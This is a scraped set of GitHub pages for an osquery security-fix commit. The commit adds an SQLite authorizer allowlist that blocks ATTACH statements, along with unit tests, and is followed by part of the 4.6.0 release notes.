|  |  | SQLITE\_DROP\_VTABLE, |
|  |  |  |
|  |  | // Users may sometimes want to create tables and views |
|  |  | SQLITE\_CREATE\_VIEW, |
|  |  | SQLITE\_DROP\_VIEW, |
|  |  | SQLITE\_CREATE\_TABLE, |
|  |  | SQLITE\_DROP\_TABLE, |
|  |  | SQLITE\_CREATE\_TEMP\_TABLE, |
|  |  | SQLITE\_DROP\_TEMP\_TABLE, |
|  |  | SQLITE\_CREATE\_TEMP\_VIEW, |
|  |  | SQLITE\_DROP\_TEMP\_VIEW, |
|  |  |  |
|  |  | // Required to allow calling functions in SQL |
|  |  | SQLITE\_FUNCTION, |
|  |  |  |
|  |  | // Required for recursive queries |
|  |  | SQLITE\_RECURSIVE, |
|  |  | }; |
|  |  |  |
|  |  | class SQLiteDBManager; |
|  |  |  |
|  |  | /\*\* |
| Expand Down | |  |

18 changes: 16 additions & 2 deletions

18
[osquery/sql/tests/sqlite\_util\_tests.cpp](#diff-de9395db6a05f49c71cebf0c9254b1599c174bc02c5eadd0b8b863416e4773f0 "osquery/sql/tests/sqlite_util_tests.cpp")

Show comments

[View file](/osquery/osquery/blob/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c/osquery/sql/tests/sqlite_util_tests.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,9 +36,10 @@ class SQLiteUtilTests : public testing::Test { |
|  |  |  |
|  |  | std::shared\_ptr<SQLiteDBInstance> getTestDBC() { |
|  |  | auto dbc = SQLiteDBManager::getUnique(); |
|  |  |  |
|  |  | char\* err = nullptr; |
|  |  | std::vector<std::string> queries = { |
|  |  | "CREATE TABLE test\_table (username varchar(30) primary key, age int)", |
|  |  | "CREATE TABLE test\_table (username varchar(30), age int)", |
|  |  | "INSERT INTO test\_table VALUES (\"mike\", 23)", |
|  |  | "INSERT INTO test\_table VALUES (\"matt\", 24)"}; |
|  |  |  |
| Expand Down  Expand Up | | @@ -434,7 +435,7 @@ TEST\_F(SQLiteUtilTests, test\_column\_type\_determination) { |
|  |  | // if they happen to have integer value. And also test multi-statement |
|  |  | // queries. |
|  |  | testTypesExpected( |
|  |  | "CREATE TABLE test\_types\_table (username varchar(30) primary key, age " |
|  |  | "CREATE TABLE test\_types\_table (username varchar(30), age " |
|  |  | "double);INSERT INTO test\_types\_table VALUES (\"mike\", 23); SELECT age " |
|  |  | "from test\_types\_table", |
|  |  | TypeMap({{"age", DOUBLE\_TYPE}})); |
| Expand All | | @@ -450,4 +451,17 @@ TEST\_F(SQLiteUtilTests, test\_enable) { |
|  |  | ASSERT\_TRUE(SQLiteDBManager::isDisabled("fake\_table")); |
|  |  | } |
|  |  |  |
|  |  | TEST\_F(SQLiteUtilTests, test\_sqlite\_authorizer) { |
|  |  | auto rc = sqliteAuthorizer( |
|  |  | nullptr, SQLITE\_ATTACH, nullptr, nullptr, nullptr, nullptr); |
|  |  | EXPECT\_EQ(SQLITE\_DENY, rc); |
|  |  |  |
|  |  | rc = sqliteAuthorizer(nullptr, 534, nullptr, nullptr, nullptr, nullptr); |
|  |  | EXPECT\_EQ(SQLITE\_DENY, rc); |
|  |  |  |
|  |  | rc = sqliteAuthorizer( |
|  |  | nullptr, SQLITE\_SELECT, nullptr, nullptr, nullptr, nullptr); |
|  |  | EXPECT\_EQ(SQLITE\_OK, rc); |
|  |  | } |
|  |  |  |
|  |  | } // namespace osquery |

8 changes: 8 additions & 0 deletions

8
[osquery/sql/virtual\_sqlite\_table.cpp](#diff-502cef6289975c268a4d1fa567bb2fe6bf82a9c776e6c2f888e20ec68d27eadc "osquery/sql/virtual_sqlite_table.cpp")

Show comments

[View file](/osquery/osquery/blob/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c/osquery/sql/virtual_sqlite_table.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -96,6 +96,14 @@ Status genTableRowsForSqliteTable(const fs::path& sqlite\_db, |
|  |  | return Status(1, "Could not open database"); |
|  |  | } |
|  |  |  |
|  |  | rc = sqlite3\_set\_authorizer(db, &sqliteAuthorizer, nullptr); |
|  |  | if (rc != SQLITE\_OK) { |
|  |  | sqlite3\_close(db); |
|  |  | auto errMsg = |
|  |  | std::string("Failed to set sqlite authorizer: ") + sqlite3\_errmsg(db); |
|  |  | return Status(1, errMsg); |
|  |  | } |
|  |  |  |
|  |  | sqlite3\_stmt\* stmt = nullptr; |
|  |  | rc = sqlite3\_prepare\_v2(db, sqlite\_query.c\_str(), -1, &stmt, nullptr); |
|  |  | if (rc != SQLITE\_OK) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `c3f9a3d`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fcommit%2Fc3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_fd4e60bb_20250119_141356.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fcommit%2Fc3f9a3dae22d43ed3b4f6a40)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fcommit%2Fc3f9a3dae22d43ed3b4f6a40)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=osquery%2Fosquery)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[osquery](/osquery)
/
**[osquery](/osquery/osquery)**
Public

* [Notifications](/login?return_to=%2Fosquery%2Fosquery) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Fosquery%2Fosquery)
* [Star
   22.2k](/login?return_to=%2Fosquery%2Fosquery)

* [Code](/osquery/osquery)
* [Issues
  586](/osquery/osquery/issues)
* [Pull requests
  35](/osquery/osquery/pulls)
* [Actions](/osquery/osquery/actions)
* [Projects
  0](/osquery/osquery/projects)
* [Security](/osquery/osquery/security)
* [Insights](/osquery/osquery/pulse)

Additional navigation options

* [Code](/osquery/osquery)
* [Issues](/osquery/osquery/issues)
* [Pull requests](/osquery/osquery/pulls)
* [Actions](/osquery/osquery/actions)
* [Projects](/osquery/osquery/projects)
* [Security](/osquery/osquery/security)
* [Insights](/osquery/osquery/pulse)

## Commit

[Permalink](/osquery/osquery/commit/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-4g56-2482-x7q8](https://github.com/osquery/osquery/security/advisories/GHSA-4g56-2482-x7q8 "GHSA-4g56-2482-x7q8")

[Browse files](/osquery/osquery/tree/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c)
Browse the repository at this point in the history

```
* Proposed fix for attach tables vulnerability

* Add authorizer to ATC tables and cleanups

- Add unit test for authorizer function
```

* Loading branch information

[![@zwass](https://avatars.githubusercontent.com/u/575602?s=40&v=4)](/zwass)

[zwass](/osquery/osquery/commits?author=zwass "View all commits by zwass")
authored
Dec 14, 2020

1 parent
[dcfbd89](/osquery/osquery/commit/dcfbd89885a33a5660a3e0c94f659ed2feec1ca1)

commit c3f9a3d

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**90 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* osquery/sql

  + osquery/sql/sqlite\_util.cpp
    [sqlite\_util.cpp](#diff-6dd653164245848440fe551392238f5bc679d72950d21984f3782aa73b148d55)
  + osquery/sql/sqlite\_util.h
    [sqlite\_util.h](#diff-1da890eb014e479fd227a8b434d9b7dbe458984ef8ee2e4b35c6823ec7042b94)
  + tests

    - osquery/sql/tests/sqlite\_util\_tests.cpp
      [sqlite\_util\_tests.cpp](#diff-de9395db6a05f49c71cebf0c9254b1599c174bc02c5eadd0b8b863416e4773f0)
  + osquery/sql/virtual\_sqlite\_table.cpp
    [virtual\_sqlite\_table.cpp](#diff-502cef6289975c268a4d1fa567bb2fe6bf82a9c776e6c2f888e20ec68d27eadc)

## There are no files selected for viewing

25 changes: 25 additions & 0 deletions

25
[osquery/sql/sqlite\_util.cpp](#diff-6dd653164245848440fe551392238f5bc679d72950d21984f3782aa73b148d55 "osquery/sql/sqlite_util.cpp")

Show comments

[View file](/osquery/osquery/blob/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c/osquery/sql/sqlite_util.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,6 +16,7 @@ |
|  |  |  |
|  |  | #include <osquery/core/core.h> |
|  |  | #include <osquery/core/flags.h> |
|  |  | #include <osquery/core/shutdown.h> |
|  |  | #include <osquery/logger/logger.h> |
|  |  | #include <osquery/registry/registry\_factory.h> |
|  |  | #include <osquery/sql/sql.h> |
| Expand Down  Expand Up | | @@ -270,6 +271,23 @@ SQLiteDBInstance::SQLiteDBInstance(sqlite3\*& db, Mutex& mtx) |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | // This function is called by SQLite when a statement is prepared and we use |
|  |  | // it to allowlist specific actions. |
|  |  | int sqliteAuthorizer(void\* userData, |
|  |  | int code, |
|  |  | const char\* arg3, |
|  |  | const char\* arg4, |
|  |  | const char\* arg5, |
|  |  | const char\* arg6) { |
|  |  | if (kAllowedSQLiteActionCodes.count(code) > 0) { |
|  |  | return SQLITE\_OK; |
|  |  | } |
|  |  | LOG(ERROR) << "Authorizer denied action " << code << " " |
|  |  | << (arg3 ? arg3 : "null") << " " << (arg4 ? arg4 : "null") << " " |
|  |  | << (arg5 ? arg5 : "null") << " " << (arg6 ? arg6 : "null"); |
|  |  | return SQLITE\_DENY; |
|  |  | } |
|  |  |  |
|  |  | static inline void openOptimized(sqlite3\*& db) { |
|  |  | sqlite3\_open(":memory:", &db); |
|  |  |  |
| Expand All | | @@ -290,6 +308,12 @@ static inline void openOptimized(sqlite3\*& db) { |
|  |  | registerFilesystemExtensions(db); |
|  |  | registerHashingExtensions(db); |
|  |  | registerEncodingExtensions(db); |
|  |  |  |
|  |  | auto rc = sqlite3\_set\_authorizer(db, &sqliteAuthorizer, nullptr); |
|  |  | if (rc != SQLITE\_OK) { |
|  |  | LOG(ERROR) << "Failed to set sqlite authorizer: " << sqlite3\_errmsg(db); |
|  |  | requestShutdown(rc); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | void SQLiteDBInstance::init() { |
| Expand Down  Expand Up | | @@ -458,6 +482,7 @@ SQLiteDBInstanceRef SQLiteDBManager::getConnection(bool primary) { |
|  |  | if (!instance->isPrimary()) { |
|  |  | attachVirtualTables(instance); |
|  |  | } |
|  |  |  |
|  |  | return instance; |
|  |  | } |
|  |  |  |
| Expand Down | |  |

41 changes: 41 additions & 0 deletions

41
[osquery/sql/sqlite\_util.h](#diff-1da890eb014e479fd227a8b434d9b7dbe458984ef8ee2e4b35c6823ec7042b94 "osquery/sql/sqlite_util.h")

Show comments

[View file](/osquery/osquery/blob/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c/osquery/sql/sqlite_util.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -29,6 +29,47 @@ |
|  |  |  |
|  |  | namespace osquery { |
|  |  |  |
|  |  | int sqliteAuthorizer(void\* userData, |
|  |  | int code, |
|  |  | const char\* arg3, |
|  |  | const char\* arg4, |
|  |  | const char\* arg5, |
|  |  | const char\* arg6); |
|  |  |  |
|  |  | // Allowlist of SQLite actions. Any action not in this set is denied. See |
|  |  | // possible values in https://sqlite.org/c3ref/c\_alter\_table.html. |
|  |  | // \*\* Never allow SQLITE\_ATTACH \*\* as it can be used to write arbitrary files. |
|  |  | const std::unordered\_set<int> kAllowedSQLiteActionCodes = { |
|  |  | // Enable basic functionality |
|  |  | SQLITE\_READ, |
|  |  | SQLITE\_SELECT, |
|  |  |  |
|  |  | // Some extensions implement writeable tables |
|  |  | SQLITE\_INSERT, |
|  |  | SQLITE\_UPDATE, |
|  |  | SQLITE\_DELETE, |
|  |  |  |
|  |  | // Allow virtual tables to be attached |
|  |  | SQLITE\_CREATE\_VTABLE, |
|  |  | SQLITE\_DROP\_VTABLE, |
|  |  |  |
|  |  | // Users may sometimes want to create tables and views |
|  |  | SQLITE\_CREATE\_VIEW, |
|  |  | SQLITE\_DROP\_VIEW, |
|  |  | SQLITE\_CREATE\_TABLE, |
|  |  | SQLITE\_DROP\_TABLE, |
|  |  | SQLITE\_CREATE\_TEMP\_TABLE, |
|  |  | SQLITE\_DROP\_TEMP\_TABLE, |
|  |  | SQLITE\_CREATE\_TEMP\_VIEW, |
|  |  | SQLITE\_DROP\_TEMP\_VIEW, |
|  |  |  |
|  |  | // Required to allow calling functions in SQL |
|  |  | SQLITE\_FUNCTION, |
|  |  |  |
|  |  | // Required for recursive queries |
|  |  | SQLITE\_RECURSIVE, |
|  |  | }; |
|  |  |  |
|  |  | class SQLiteDBManager; |
|  |  |  |
|  |  | /\*\* |
| Expand Down | |  |

18 changes: 16 additions & 2 deletions

18
[osquery/sql/tests/sqlite\_util\_tests.cpp](#diff-de9395db6a05f49c71cebf0c9254b1599c174bc02c5eadd0b8b863416e4773f0 "osquery/sql/tests/sqlite_util_tests.cpp")

Show comments

[View file](/osquery/osquery/blob/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c/osquery/sql/tests/sqlite_util_tests.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,9 +36,10 @@ class SQLiteUtilTests : public testing::Test { |
|  |  |  |
|  |  | std::shared\_ptr<SQLiteDBInstance> getTestDBC() { |
|  |  | auto dbc = SQLiteDBManager::getUnique(); |
|  |  |  |
|  |  | char\* err = nullptr; |
|  |  | std::vector<std::string> queries = { |
|  |  | "CREATE TABLE test\_table (username varchar(30) primary key, age int)", |
|  |  | "CREATE TABLE test\_table (username varchar(30), age int)", |
|  |  | "INSERT INTO test\_table VALUES (\"mike\", 23)", |
|  |  | "INSERT INTO test\_table VALUES (\"matt\", 24)"}; |
|  |  |  |
| Expand Down  Expand Up | | @@ -434,7 +435,7 @@ TEST\_F(SQLiteUtilTests, test\_column\_type\_determination) { |
|  |  | // if they happen to have integer value. And also test multi-statement |
|  |  | // queries. |
|  |  | testTypesExpected( |
|  |  | "CREATE TABLE test\_types\_table (username varchar(30) primary key, age " |
|  |  | "CREATE TABLE test\_types\_table (username varchar(30), age " |
|  |  | "double);INSERT INTO test\_types\_table VALUES (\"mike\", 23); SELECT age " |
|  |  | "from test\_types\_table", |
|  |  | TypeMap({{"age", DOUBLE\_TYPE}})); |
| Expand All | | @@ -450,4 +451,17 @@ TEST\_F(SQLiteUtilTests, test\_enable) { |
|  |  | ASSERT\_TRUE(SQLiteDBManager::isDisabled("fake\_table")); |
|  |  | } |
|  |  |  |
|  |  | TEST\_F(SQLiteUtilTests, test\_sqlite\_authorizer) { |
|  |  | auto rc = sqliteAuthorizer( |
|  |  | nullptr, SQLITE\_ATTACH, nullptr, nullptr, nullptr, nullptr); |
|  |  | EXPECT\_EQ(SQLITE\_DENY, rc); |
|  |  |  |
|  |  | rc = sqliteAuthorizer(nullptr, 534, nullptr, nullptr, nullptr, nullptr); |
|  |  | EXPECT\_EQ(SQLITE\_DENY, rc); |
|  |  |  |
|  |  | rc = sqliteAuthorizer( |
|  |  | nullptr, SQLITE\_SELECT, nullptr, nullptr, nullptr, nullptr); |
|  |  | EXPECT\_EQ(SQLITE\_OK, rc); |
|  |  | } |
|  |  |  |
|  |  | } // namespace osquery |

8 changes: 8 additions & 0 deletions

8
[osquery/sql/virtual\_sqlite\_table.cpp](#diff-502cef6289975c268a4d1fa567bb2fe6bf82a9c776e6c2f888e20ec68d27eadc "osquery/sql/virtual_sqlite_table.cpp")

Show comments

[View file](/osquery/osquery/blob/c3f9a3dae22d43ed3b4f6a403cbf89da4cba7c3c/osquery/sql/virtual_sqlite_table.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -96,6 +96,14 @@ Status genTableRowsForSqliteTable(const fs::path& sqlite\_db, |
|  |  | return Status(1, "Could not open database"); |
|  |  | } |
|  |  |  |
|  |  | rc = sqlite3\_set\_authorizer(db, &sqliteAuthorizer, nullptr); |
|  |  | if (rc != SQLITE\_OK) { |
|  |  | sqlite3\_close(db); |
|  |  | auto errMsg = |
|  |  | std::string("Failed to set sqlite authorizer: ") + sqlite3\_errmsg(db); |
|  |  | return Status(1, errMsg); |
|  |  | } |
|  |  |  |
|  |  | sqlite3\_stmt\* stmt = nullptr; |
|  |  | rc = sqlite3\_prepare\_v2(db, sqlite\_query.c\_str(), -1, &stmt, nullptr); |
|  |  | if (rc != SQLITE\_OK) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `c3f9a3d`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Fcommit%2Fc3f9a3dae22d43ed3b4f6a40) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_a3231a8a_20250119_124047.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Freleases%2Ftag%2F4.6.0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fosquery%2Fosquery%2Freleases%2Ftag%2F4.6.0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=osquery%2Fosquery)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[osquery](/osquery)
/
**[osquery](/osquery/osquery)**
Public

* [Notifications](/login?return_to=%2Fosquery%2Fosquery) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Fosquery%2Fosquery)
* [Star
   22.2k](/login?return_to=%2Fosquery%2Fosquery)

* [Code](/osquery/osquery/tree/4.6.0)
* [Issues
  586](/osquery/osquery/issues)
* [Pull requests
  35](/osquery/osquery/pulls)
* [Actions](/osquery/osquery/actions)
* [Projects
  0](/osquery/osquery/projects)
* [Security](/osquery/osquery/security)
* [Insights](/osquery/osquery/pulse)

Additional navigation options

* [Code](/osquery/osquery/tree/4.6.0)
* [Issues](/osquery/osquery/issues)
* [Pull requests](/osquery/osquery/pulls)
* [Actions](/osquery/osquery/actions)
* [Projects](/osquery/osquery/projects)
* [Security](/osquery/osquery/security)
* [Insights](/osquery/osquery/pulse)

1. [Releases](/osquery/osquery/releases)
2. [4.6.0](/osquery/osquery/releases/tag/4.6.0)

# 4.6.0

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/osquery/osquery/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...4.6.0)

 Loading

[View all tags](/osquery/osquery/tags)

![@directionless](https://avatars.githubusercontent.com/u/179542?s=40&v=4)
[directionless](/directionless)
released this
15 Dec 04:28

·
[830 commits](/osquery/osquery/compare/4.6.0...master)
to master
since this release

[4.6.0](/osquery/osquery/tree/4.6.0)

[`6d0348c`](/osquery/osquery/commit/6d0348ce29013852997f1dfb322776a00a849a18)

This commit was created on GitHub.com and signed with GitHub’s **verified signature**.
The key has expired.

GPG key ID: 4AEE18F83AFDEB23
Expired

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

## [4.6.0](https://github.com/osquery/osquery/releases/tag/4.6.0)

[Git Commits](https://github.com/osquery/osquery/compare/4.5.1...4.6.0)

### New Features

* Initial implementations for BPF-based socket and process events tables ([#6571](https://github.com/osquery/osquery/pull/6571))
* Support EC2 tables on Windows ([#6756](https://github.com/osquery/osquery/pull/6756))

### Under the Hood improvements

* BPF: Add container support to fork/vfork/clone ([#6721](https://github.com/osquery/osquery/pull/6721))
* BPF: Additional improvements on the initial implementation ([#6717](https://github.com/osquery/osquery/pull/6717))
* BPF: Fix the tests ([#6783](https://github.com/osquery/osquery/pull/6783))
* BPF: Fix wrong d\_type compare in filesystem classes ([#6774](https://github.com/osquery/osquery/pull/6774))
* BPF: Implement additional syscalls to track file descriptor usage ([#6723](https://github.com/osquery/osquery/pull/6723))
* Remove unused LTCG flag ([#6769](https://github.com/osquery/osquery/pull/6769))
* Support TLS client certificate chains ([#6753](https://github.com/osquery/osquery/pull/6753))
* Refactor carver to use the Scheduler ([#6671](https://github.com/osquery/osquery/pull/6671))
* Add configuration flag to disable file\_events by default ([#6663](https://github.com/osquery/osquery/pull/6663))
* libs: Build x86\_64 configurations on Ubuntu 14.04 ([#6687](https://github.com/osquery/osquery/pull/6687))
* libs: Port the RocksDB Win7 compatibility patch to the MSBuild generator ([#6765](https://github.com/osquery/osquery/pull/6765))
* libs: Update BPF libraries to support LLVM 11 ([#6775](https://github.com/osquery/osquery/pull/6775))
* libs: Update RocksDB to version 6.14.5 ([#6759](https://github.com/osquery/osquery/pull/6759))
* libs: Update bzip2 to version 1.0.8 ([#6786](https://github.com/osquery/osquery/pull/6786))
* libs: Update ebpfpub to latest version ([#6757](https://github.com/osquery/osquery/pull/6757))
* libs: Update sqlite to version 3.34.0 ([#6804](https://github.com/osquery/osquery/pull/6804))
* libs: update aws-sdk to 1.7.230 ([#6749](https://github.com/osquery/osquery/pull/6749))
* Adding support for pretty-printing JSON results in osqueryi ([#6695](https://github.com/osquery/osquery/pull/6695))

### Table Changes

